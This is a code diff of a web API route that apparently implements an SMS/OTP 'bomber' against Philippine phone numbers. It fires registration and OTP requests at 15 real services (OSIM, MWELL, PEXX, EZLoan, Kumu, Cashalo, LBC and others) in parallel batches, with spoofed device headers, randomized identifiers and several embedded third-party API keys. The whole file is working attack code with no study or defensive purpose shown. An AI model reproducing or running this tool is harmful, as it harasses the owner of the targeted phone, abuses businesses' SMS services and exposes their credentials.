@@ -1,7 +1,21 @@
-// pages/api/attack.js
 import { randomBytes, createHash, randomUUID } from 'crypto';
 
-// ---------- Helper functions (identical to Python) ----------
+// Rate limiting (anti‑DDOS)
+const requestLog = new Map();
+const RATE_LIMIT = 10; // max requests per minute per IP
+const RATE_WINDOW = 60000;
+
+function isRateLimited(ip) {
+  const now = Date.now();
+  const windowStart = now - RATE_WINDOW;
+  const requests = (requestLog.get(ip) || []).filter(t => t > windowStart);
+  if (requests.length >= RATE_LIMIT) return true;
+  requests.push(now);
+  requestLog.set(ip, requests);
+  return false;
+}
+
+// Helper functions (identical to Python)
 function formatPhone(phone) {
   let cleaned = phone.toString().replace(/[\s\-+]/g, '');
   if (cleaned.startsWith('0')) cleaned = cleaned.substring(1);
@@ -23,31 +37,22 @@ function generateKumuSignature(ts, rnd, phone) {
   return createHash('sha256').update(data).digest('hex');
 }
 
-// ---------- The 15 services (exact copies from Python) ----------
+// ========== 15 API SERVICES (exact headers & logic from Python) ==========
 async function callBombOTP(phone) {
   const formatted = formatPhone(phone);
   const headers = {
     'User-Agent': 'OSIM/1.55.0 (Android 16; CPH2465; OP5958L1; arm64-v8a)',
-    'Accept': 'application/json',
-    'Accept-Encoding': 'gzip',
-    'Content-Type': 'application/json',
-    'accept-language': 'en-SG',
-    'region': 'PH'
+    'Accept': 'application/json', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json',
+    'accept-language': 'en-SG', 'region': 'PH'
   };
-  const body = {
-    userName: formatted,
-    phoneCode: "63",
-    password: `TempPass${Math.floor(Math.random() * 9000 + 1000)}!`
-  };
+  const body = { userName: formatted, phoneCode: "63", password: `TempPass${Math.floor(Math.random() * 9000 + 1000)}!` };
   try {
     const res = await fetch('https://prod.services.osim-cloud.com/identity/api/v1.0/account/register', {
       method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
     });
     if (res.status === 200) {
       const data = await res.json();
-      if (data.resultCode === 201000 || data.resultCode === 200000) {
-        return { success: true, message: data.message || 'OTP sent' };
-      }
+      if (data.resultCode === 201000 || data.resultCode === 200000) return { success: true, message: data.message || 'OTP sent' };
       return { success: false, message: data.message || `Code ${data.resultCode}` };
     }
     return { success: false, message: `HTTP ${res.status}` };
@@ -57,15 +62,12 @@ async function callBombOTP(phone) {
 async function callMWELL(phone) {
   const formatted = formatPhone(phone);
   const headers = {
-    'User-Agent': 'okhttp/4.11.0',
-    'Accept-Encoding': 'gzip',
-    'Content-Type': 'application/json',
+    'User-Agent': 'okhttp/4.11.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json',
     'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
     'x-app-version': ['03.942.035','03.942.036','03.942.037','03.942.038'][Math.floor(Math.random()*4)],
     'x-device-type': 'android',
     'x-device-model': ['oneplus CPH2465','samsung SM-G998B','xiaomi Redmi Note 13','realme RMX3700'][Math.floor(Math.random()*4)],
-    'x-timestamp': Date.now().toString(),
-    'x-request-id': randomString(16)
+    'x-timestamp': Date.now().toString(), 'x-request-id': randomString(16)
   };
   const body = { country: "PH", phoneNumber: formatted, phoneNumberPrefix: "+63" };
   try {
@@ -91,12 +93,8 @@ async function callMWELL(phone) {
 async function callPEXX(phone) {
   const formatted = formatPhone(phone);
   const headers = {
-    'User-Agent': 'okhttp/4.12.0',
-    'Accept-Encoding': 'gzip',
-    'Content-Type': 'application/json',
-    'tid': randomString(11),
-    'appversion': '3.0.14',
-    'sentry-trace': randomString(32),
+    'User-Agent': 'okhttp/4.12.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json',
+    'tid': randomString(11), 'appversion': '3.0.14', 'sentry-trace': randomString(32),
     'baggage': `sentry-environment=production,sentry-public_key=811267d2b611af4416884dd91d0e093c,sentry-trace_id=${randomString(32)}`
   };
   const body = [{ json: { email: "", areaCode: "+63", phone: `+63${formatted}`, otpChannel: "TG", otpUsage: "REGISTRATION" } }];
@@ -120,21 +118,11 @@ async function callEZLoan(phone) {
   const formatted = formatPhone(phone);
   const ts = Date.now();
   const headers = {
-    'User-Agent': 'okhttp/4.9.2',
-    'Content-Type': 'application/json',
-    'imei': '7a997625bd704baebae5643a3289eb33',
-    'device': 'android',
-    'brand': 'oneplus',
-    'model': 'CPH2465',
-    'source': 'EZLOAN',
-    'appversion': '2.0.4',
+    'User-Agent': 'okhttp/4.9.2', 'Content-Type': 'application/json', 'imei': '7a997625bd704baebae5643a3289eb33',
+    'device': 'android', 'brand': 'oneplus', 'model': 'CPH2465', 'source': 'EZLOAN', 'appversion': '2.0.4',
     'blackbox': `kGPGg${ts}DCl3O8MVBR0`
   };
-  const body = {
-    businessId: "EZLOAN",
-    contactNumber: `+63${formatted}`,
-    appsflyerIdentifier: `${ts}-${Math.floor(Math.random() * 1e19)}`
-  };
+  const body = { businessId: "EZLOAN", contactNumber: `+63${formatted}`, appsflyerIdentifier: `${ts}-${Math.floor(Math.random() * 1e19)}` };
   try {
     const res = await fetch('https://gateway.ezloancash.ph/security/auth/otp/request', {
       method: 'POST', headers, body: JSON.stringify(body), signal: AbortSignal.timeout(8000)
@@ -153,9 +141,8 @@ async function callXpress(phone, index) {
   const ts = Math.floor(Date.now() / 1000);
   const headers = { "User-Agent": "Dalvik/2.1.0", "Content-Type": "application/json" };
   const body = {
-    FirstName: `User${ts}_${index}`, LastName: "Test",
-    Email: `user${ts}_${index}@gmail.com`, Phone: `+63${formatted}`,
-    Password: `Pass${Math.floor(Math.random() * 9000 + 1000)}`,
+    FirstName: `User${ts}_${index}`, LastName: "Test", Email: `user${ts}_${index}@gmail.com`,
+    Phone: `+63${formatted}`, Password: `Pass${Math.floor(Math.random() * 9000 + 1000)}`,
     ConfirmPassword: `Pass${Math.floor(Math.random() * 9000 + 1000)}`
   };
   try {
@@ -193,9 +180,7 @@ async function callBistro(phone) {
   const url = `https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63${formatted}`;
   const headers = {
     'User-Agent': 'Mozilla/5.0 (Linux; Android 16; CPH2465 Build/BP2A.250605.031.A2; wv) AppleWebKit/537.36',
-    'Accept': 'application/json',
-    'origin': 'http://localhost',
-    'x-requested-with': 'com.allcardtech.bistro'
+    'Accept': 'application/json', 'origin': 'http://localhost', 'x-requested-with': 'com.allcardtech.bistro'
   };
   try {
     const res = await fetch(url, { headers, signal: AbortSignal.timeout(10000) });
@@ -211,8 +196,7 @@ async function callBistro(phone) {
 async function callBayad(phone) {
   const formatted = formatPhone(phone);
   const headers = {
-    "accept": "application/json",
-    "content-type": "application/json",
+    "accept": "application/json", "content-type": "application/json",
     "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
   };
   const email = randomGmail();
@@ -230,11 +214,8 @@ async function callLBC(phone) {
   const formatted = formatPhone(phone);
   const headers = { 'User-Agent': 'Dart/2.19', 'Content-Type': 'application/x-www-form-urlencoded' };
   const body = new URLSearchParams({
-    verification_type: 'mobile',
-    client_email: randomGmail(),
-    client_contact_code: '+63',
-    client_contact_no: formatted,
-    app_log_uid: randomString(16)
+    verification_type: 'mobile', client_email: randomGmail(), client_contact_code: '+63',
+    client_contact_no: formatted, app_log_uid: randomString(16)
   });
   try {
     const res = await fetch('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', {
@@ -277,18 +258,12 @@ async function callKumuPH(phone) {
   const rndString = randomString(32);
   const signature = generateKumuSignature(timestamp, rndString, formatted);
   const headers = {
-    'User-Agent': 'okhttp/5.0.0-alpha.14',
-    'Content-Type': 'application/json;charset=UTF-8',
-    'Device-Type': 'android',
-    'Device-Id': '07b76e92c40b536a',
-    'Version-Code': '1669'
+    'User-Agent': 'okhttp/5.0.0-alpha.14', 'Content-Type': 'application/json;charset=UTF-8',
+    'Device-Type': 'android', 'Device-Id': '07b76e92c40b536a', 'Version-Code': '1669'
   };
   const body = {
-    country_code: "+63",
-    encrypt_rnd_string: rndString,
-    cellphone: formatted,
-    encrypt_signature: signature,
-    encrypt_timestamp: timestamp
+    country_code: "+63", encrypt_rnd_string: rndString, cellphone: formatted,
+    encrypt_signature: signature, encrypt_timestamp: timestamp
   };
   try {
     const res = await fetch('https://api.kumuapi.com/v2/user/sendverifysms', {
@@ -323,19 +298,13 @@ async function callCashalo(phone) {
   const formatted = formatPhone(phone);
   const deviceId = randomString(16);
   const headers = {
-    'User-Agent': 'okhttp/4.12.0',
-    'Content-Type': 'application/json',
+    'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json',
     'x-api-key': 'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==',
-    'x-device-identifier': deviceId,
-    'x-device-type': '1',
-    'x-firebase-instance-id': randomString(32)
+    'x-device-identifier': deviceId, 'x-device-type': '1', 'x-firebase-instance-id': randomString(32)
   };
   const body = {
-    phone_number: formatted,
-    device_identifier: deviceId,
-    device_type: 1,
-    apps_flyer_device_id: `${Date.now()}-${randomString(15)}`,
-    advertising_id: randomUUID()
+    phone_number: formatted, device_identifier: deviceId, device_type: 1,
+    apps_flyer_device_id: `${Date.now()}-${randomString(15)}`, advertising_id: randomUUID()
   };
   try {
     const res = await fetch('https://api.cashaloapp.com/access/register', {
@@ -350,25 +319,28 @@ async function callCashalo(phone) {
   } catch (e) { return { success: false, message: e.message }; }
 }
 
-// ---------- Attack state & event stream ----------
+// ========== Attack state & SSE ==========
 let activeAttack = null;
-let attackClients = new Set(); // for SSE
+let attackClients = new Set();
 
 export default async function handler(req, res) {
-  // POST – start an attack
+  // Rate limiting (anti‑DDOS)
+  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  if (isRateLimited(ip)) {
+    return res.status(429).json({ error: "Nice try kid! Slow down." });
+  }
+
+  // POST – start attack
   if (req.method === 'POST') {
-    const { phone, batches, token } = req.body;
+    const { phone, batches } = req.body;
     if (!phone || !batches) return res.status(400).json({ error: 'Missing parameters' });
     const formatted = formatPhone(phone);
     if (!/^9\d{9}$/.test(formatted)) return res.status(400).json({ error: 'Invalid Philippine number' });
     if (batches < 1 || batches > 100) return res.status(400).json({ error: 'Batches 1-100' });
     if (activeAttack) return res.status(409).json({ error: 'Attack already running' });
 
-    // Fire-and-forget attack
     activeAttack = {
-      phone,
-      batches,
-      cancelled: false,
+      phone, batches, cancelled: false,
       stats: { success: 0, fail: 0, total: 0 },
       mwellCooldown: 0, mwellLastCall: 0,
       pexxCooldown: 0, pexxLastCall: 0,
@@ -378,12 +350,11 @@ export default async function handler(req, res) {
         if (type === 'stats') activeAttack.stats = { ...activeAttack.stats, ...message };
       }
     };
-    // Start async attack
     runAttack(activeAttack);
     return res.json({ success: true });
   }
 
-  // GET – Server‑Sent Events for logs
+  // GET – Server‑Sent Events
   if (req.method === 'GET') {
     res.setHeader('Content-Type', 'text/event-stream');
     res.setHeader('Cache-Control', 'no-cache');
@@ -426,10 +397,8 @@ async function runAttack(attack) {
 
   for (let batch = 1; batch <= batches && !attack.cancelled; batch++) {
     log('batch_start', 'SYSTEM', batch, true, `Starting batch ${batch}/${batches}`);
-    // Run all services in parallel
     const promises = allServices.map(async svc => {
       if (attack.cancelled) return null;
-      // Cooldown handling for MWELL & PEXX
       if (svc.cooldown) {
         const cooldownSec = svc.cooldown.get();
         if (cooldownSec > 0) {
@@ -446,7 +415,6 @@ async function runAttack(attack) {
         else attack.stats.fail++;
         log('log', svc.name, batch, result.success, result.message || (result.success ? 'Success' : 'Failed'));
         log('stats', '', batch, true, { total: attack.stats.total, success: attack.stats.success, fail: attack.stats.fail });
-        // Update cooldown
         if (svc.cooldown && result.cooldown) {
           svc.cooldown.set(result.cooldown);
           svc.cooldown.setLast(Date.now());
